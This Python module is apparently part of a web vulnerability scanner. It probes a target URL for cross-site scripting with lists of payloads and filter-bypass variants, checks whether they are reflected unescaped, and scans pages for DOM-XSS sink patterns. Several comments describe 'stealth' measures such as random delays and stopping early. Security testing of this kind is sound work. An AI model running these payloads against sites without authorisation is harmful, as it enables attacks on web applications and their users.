"""
xss.py
------
Enhanced Cross-Site Scripting (XSS) detection module with multiple attack vectors:
- Reflected XSS detection
- DOM-based XSS indicators
- Filter bypass techniques
- Context-aware payload testing
- Multiple parameter testing
- WAF/filter evasion payloads

Severity:
- Confirmed XSS = High
- Possible XSS (filtered/encoded) = Medium
- DOM XSS indicators = Medium
- No XSS = Info
"""

import requests
import time
import random
import urllib.parse
from typing import Optional, List, Dict, Tuple
from urllib.parse import urlparse, parse_qs
from colorama import Fore
import re
import html

FALLBACK_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

class XSSScanner:
    def __init__(self, client: Optional[object] = None):
        self.client = client
        self.findings = []
        
    def _make_request(self, url: str, **kwargs) -> Optional[requests.Response]:
        """Make HTTP request using client or fallback to requests"""
        try:
            if self.client is not None:
                return self.client.get(url, allow_redirects=True, **kwargs)
            else:
                response = requests.get(
                    url, headers=FALLBACK_HEADERS, timeout=8, 
                    allow_redirects=True, **kwargs
                )
                time.sleep(random.uniform(0.4, 1.2))
                return response
        except Exception as e:
            print(Fore.RED + f"[!] Request failed: {e}")
            return None
    
    def _get_payload_variations(self, payload: str) -> List[str]:
        """Generate payload variations for bypass testing"""
        variations = [payload]
        
        # Case variations
        variations.append(payload.upper())
        variations.append(payload.lower())
        
        # Encoding variations
        variations.append(html.escape(payload))
        variations.append(urllib.parse.quote(payload))
        variations.append(urllib.parse.quote_plus(payload))
        
        # Double encoding
        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        return variations
    
    def _test_reflected_xss(self, target: str) -> List[Dict]:
        """Test for reflected XSS vulnerabilities"""
        print(Fore.CYAN + "  [*] Testing reflected XSS...")
        findings = []
        
        # Graduated payload complexity for stealth
        basic_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        # Advanced filter bypass payloads
        bypass_payloads = [
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>XSS</marquee>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>"
        ]
        
        # Start with basic payloads
        all_payloads = basic_payloads + bypass_payloads[:3]  # Limit for stealth
        
        for payload in all_payloads:
            encoded_payload = urllib.parse.quote(payload)
            rnd = random.randint(1000, 9999)
            
            if "?" in target:
                test_url = f"{target}&test={encoded_payload}&rnd={rnd}"
            else:
                test_url = f"{target.rstrip('/')}/?q={encoded_payload}&rnd={rnd}"
            
            print(Fore.YELLOW + f"    [+] Testing: {payload[:30]}...")
            
            response = self._make_request(test_url)
            if not response:
                continue
            
            # Check for payload reflection
            reflection_result = self._check_payload_reflection(payload, response.text)
            
            if reflection_result['reflected']:
                severity = "High" if reflection_result['unescaped'] else "Medium"
                findings.append({
                    "issue": f"{'Reflected' if reflection_result['unescaped'] else 'Filtered'} XSS with payload: {payload}",
                    "severity": severity,
                    "evidence": reflection_result['context'],
                    "url": test_url
                })
                
                if reflection_result['unescaped']:
                    print(Fore.RED + f"[!] Reflected XSS detected: {payload}")
                    return findings  # Return on confirmed XSS for stealth
                else:
                    print(Fore.YELLOW + f"[!] Possible XSS (filtered): {payload}")
        
        return findings
    
    def _test_dom_xss_indicators(self, target: str) -> List[Dict]:
        """Look for DOM XSS indicators in JavaScript code"""
        print(Fore.CYAN + "  [*] Checking for DOM XSS indicators...")
        findings = []
        
        response = self._make_request(target)
        if not response:
            return findings
        
        # JavaScript patterns that could lead to DOM XSS
        dangerous_patterns = [
            (r'document\.write\s*\(\s*[^)]*location', 'document.write with location'),
            (r'innerHTML\s*=\s*[^;]*location', 'innerHTML assignment with location'),
            (r'outerHTML\s*=\s*[^;]*location', 'outerHTML assignment with location'),
            (r'eval\s*\(\s*[^)]*location', 'eval with location'),
            (r'setTimeout\s*\(\s*[^,)]*location', 'setTimeout with location'),
            (r'setInterval\s*\(\s*[^,)]*location', 'setInterval with location'),
            (r'document\.createElement\s*\([^)]*\)\s*\.src\s*=.*location', 'Dynamic element creation with location'),
            (r'window\.open\s*\([^)]*location', 'window.open with location'),
            (r'location\.href\s*=.*document\.URL', 'location.href assignment with document.URL')
        ]
        
        response_text = response.text
        
        for pattern, description in dangerous_patterns:
            matches = re.finditer(pattern, response_text, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                findings.append({
                    "issue": f"Potential DOM XSS: {description}",
                    "severity": "Medium",
                    "evidence": f"Pattern found: {match.group()}",
                    "url": target
                })
                print(Fore.YELLOW + f"[!] DOM XSS indicator: {description}")
        
        return findings
    
    def _test_stored_xss_indicators(self, target: str) -> List[Dict]:
        """Basic test for stored XSS by submitting and retrieving payloads"""
        print(Fore.CYAN + "  [*] Testing for stored XSS indicators...")
        findings = []
        
        # Look for forms that might store data
        response = self._make_request(target)
        if not response:
            return findings
        
        # Check for common form patterns that might lead to stored XSS
        form_patterns = [
            r'<form[^>]*method=["\']?post["\']?[^>]*>.*?<input[^>]*name=["\']?(comment|message|content|text|body)["\']?',
            r'<textarea[^>]*name=["\']?(comment|message|content|text|body)["\']?',
            r'<input[^>]*type=["\']?text["\']?[^>]*name=["\']?(search|query|q)["\']?'
        ]
        
        for pattern in form_patterns:
            if re.search(pattern, response.text, re.IGNORECASE | re.DOTALL):
                findings.append({
                    "issue": "Form detected - potential stored XSS testing point",
                    "severity": "Info",
                    "evidence": "Form with text input found",
                    "url": target
                })
                print(Fore.CYAN + "[*] Form detected for potential stored XSS testing")
                break
        
        return findings
    
    def _test_multiple_parameters(self, target: str) -> List[Dict]:
        """Test XSS in multiple URL parameters"""
        findings = []
        
        parsed_url = urlparse(target)
        if not parsed_url.query:
            return findings
        
        params = parse_qs(parsed_url.query)
        if len(params) <= 1:
            return findings
        
        print(Fore.CYAN + f"  [*] Testing {len(params)} parameters for XSS...")
        
        # Simple XSS payload for parameter testing
        test_payload = "<script>alert('xss')</script>"
        
        for param_name in list(params.keys())[:3]:  # Limit to 3 params for stealth
            print(Fore.YELLOW + f"    [+] Testing parameter: {param_name}")
            
            # Build URL with payload in specific parameter
            new_params = params.copy()
            new_params[param_name] = [test_payload]
            
            query_parts = []
            for k, v_list in new_params.items():
                for v in v_list:
                    query_parts.append(f"{k}={urllib.parse.quote(str(v))}")
            
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{'&'.join(query_parts)}"
            
            response = self._make_request(test_url)
            if not response:
                continue
            
            # Check for reflection
            reflection_result = self._check_payload_reflection(test_payload, response.text)
            
            if reflection_result['reflected']:
                severity = "High" if reflection_result['unescaped'] else "Medium"
                findings.append({
                    "issue": f"XSS in parameter '{param_name}': {test_payload}",
                    "severity": severity,
                    "evidence": f"Parameter: {param_name}, Context: {reflection_result['context']}",
                    "url": test_url
                })
                print(Fore.RED + f"[!] XSS detected in parameter: {param_name}")
        
        return findings
    
    def _test_filter_bypass(self, target: str) -> List[Dict]:
        """Test advanced filter bypass techniques"""
        print(Fore.CYAN + "  [*] Testing filter bypass techniques...")
        findings = []
        
        # Advanced bypass payloads
        bypass_payloads = [
            # Case manipulation
            "<ScRiPt>alert(1)</ScRiPt>",
            "<IMG SRC=x ONERROR=alert(1)>",
            
            # Attribute breaking
            "\"><svg onload=alert(1)>",
            "'><svg onload=alert(1)>",
            
            # HTML entity encoding
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            
            # JavaScript pseudo-protocol
            "javascript:alert(String.fromCharCode(88,83,83))",
            
            # Event handlers
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            
            # Unicode/encoding bypasses
            "<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>",
            
            # Template bypasses
            "<template><script>alert(1)</script></template>",
            
            # SVG bypasses
            "<svg><script>alert(1)</script></svg>"
        ]
        
        for payload in bypass_payloads[:5]:  # Limit for stealth
            encoded_payload = urllib.parse.quote(payload)
            rnd = random.randint(1000, 9999)
            
            if "?" in target:
                test_url = f"{target}&bypass={encoded_payload}&rnd={rnd}"
            else:
                test_url = f"{target.rstrip('/')}/?bypass={encoded_payload}&rnd={rnd}"
            
            print(Fore.YELLOW + f"    [+] Testing bypass: {payload[:40]}...")
            
            response = self._make_request(test_url)
            if not response:
                continue
            
            reflection_result = self._check_payload_reflection(payload, response.text)
            
            if reflection_result['reflected'] and reflection_result['unescaped']:
                findings.append({
                    "issue": f"Filter bypass XSS: {payload}",
                    "severity": "High",
                    "evidence": f"Bypass successful: {reflection_result['context']}",
                    "url": test_url
                })
                print(Fore.RED + f"[!] Filter bypass successful: {payload}")
                return findings  # Return on successful bypass
        
        return findings
    
    def _check_payload_reflection(self, payload: str, response_text: str) -> Dict:
        """
        Check if payload is reflected and in what context
        Returns: {'reflected': bool, 'unescaped': bool, 'context': str}
        """
        # Check various forms the payload might appear in the response
        checks = [
            payload,                                           # Exact payload
            html.escape(payload),                             # HTML escaped
            html.escape(payload, quote=True),                 # HTML escaped with quotes
            urllib.parse.quote(payload),                      # URL encoded
            payload.replace("<", "&lt;").replace(">", "&gt;") # Basic HTML encoding
        ]
        
        for i, check in enumerate(checks):
            if check in response_text:
                # Find context around the reflection
                index = response_text.find(check)
                start = max(0, index - 50)
                end = min(len(response_text), index + len(check) + 50)
                context = response_text[start:end].replace('\n', ' ').strip()
                
                return {
                    'reflected': True,
                    'unescaped': i == 0,  # Only first check is unescaped
                    'context': f"...{context}..."
                }
        
        return {'reflected': False, 'unescaped': False, 'context': ''}
    
    def _analyze_response_context(self, payload: str, response_text: str) -> str:
        """Analyze the HTML context where payload appears"""
        if payload not in response_text:
            return "not_found"
        
        index = response_text.find(payload)
        context_start = max(0, index - 100)
        context_end = min(len(response_text), index + len(payload) + 100)
        context = response_text[context_start:context_end].lower()
        
        # Determine context type
        if '<script' in context and '</script>' in context:
            return "script_context"
        elif any(attr in context for attr in ['onclick=', 'onerror=', 'onload=', 'onmouseover=']):
            return "event_handler"
        elif '<input' in context or '<textarea' in context:
            return "form_input"
        elif any(tag in context for tag in ['<div', '<span', '<p', '<h1', '<h2', '<h3']):
            return "html_content"
        else:
            return "unknown_context"


def run(target: str, client: Optional[object] = None) -> List[Dict]:
    """
    Main XSS testing function with multiple attack vectors
    """
    print(Fore.CYAN + "\n[*] Checking for XSS...")
    
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    
    scanner = XSSScanner(client)
    all_findings = []
    
    # Run different types of XSS tests
    test_methods = [
        scanner._test_reflected_xss,
        scanner._test_dom_xss_indicators,
        scanner._test_multiple_parameters,
        scanner._test_filter_bypass,
        scanner._test_stored_xss_indicators
    ]
    
    for test_method in test_methods:
        try:
            findings = test_method(target)
            all_findings.extend(findings)
            
            # If we found high severity findings, stop for stealth
            if any(f.get("severity") == "High" for f in findings):
                print(Fore.YELLOW + "  [!] High severity XSS detected, stopping further tests for stealth")
                break
                
        except Exception as e:
            print(Fore.RED + f"[!] Error in {test_method.__name__}: {e}")
    
    if not all_findings:
        print(Fore.GREEN + "[-] No XSS vulnerability detected.")
        all_findings.append({"issue": "No XSS detected", "severity": "Info"})
    else:
        high_findings = len([f for f in all_findings if f.get('severity') == 'High'])
        medium_findings = len([f for f in all_findings if f.get('severity') == 'Medium'])
        print(Fore.MAGENTA + f"[*] XSS testing completed. Found {high_findings} high and {medium_findings} medium severity findings.")
    
    return all_findings